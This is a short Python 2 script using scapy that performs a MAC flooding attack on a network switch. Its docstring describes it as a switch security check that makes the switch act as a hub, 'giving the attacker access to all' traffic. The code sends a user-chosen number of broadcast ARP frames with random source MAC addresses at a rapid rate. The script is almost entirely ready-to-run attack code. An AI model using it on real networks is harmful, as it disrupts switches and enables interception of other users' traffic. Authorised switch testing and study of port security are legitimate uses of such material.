'''
MAC Flood Attack

Checks the security of a switch.

Floods the network large numbers of requests,
when the large number of request get sent, the switch acts as a hub,
giving the attacker access to all.

If port security is setup on a switch, it limits the MAC addresses to the selected few stored or limited number.

Install scapy: sudo pip install scapy

Interface can be wlan or eth.

'''

#Imports scapy module.
from scapy.all import *

#Stores the amount of packets to be sent.
num = int(raw_input("Enter the amount of packets "))

#Stores the interface in interface string.
interface = raw_input("Enter the Interface ")

#Stores a ethernet packet with a random MAC address and broadcast address.
eth_pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")

#ARP request packet is formed and stored in arp_pkt
arp_pkt = ARP(pdst="192.168.1.255", hwdst="ff:ff:ff:ff:ff:ff")

try:
	sendp(eth_pkt/arp_pkt, iface=interface, count = num, inter = .001)

except:
	print "Destination Unreachable."
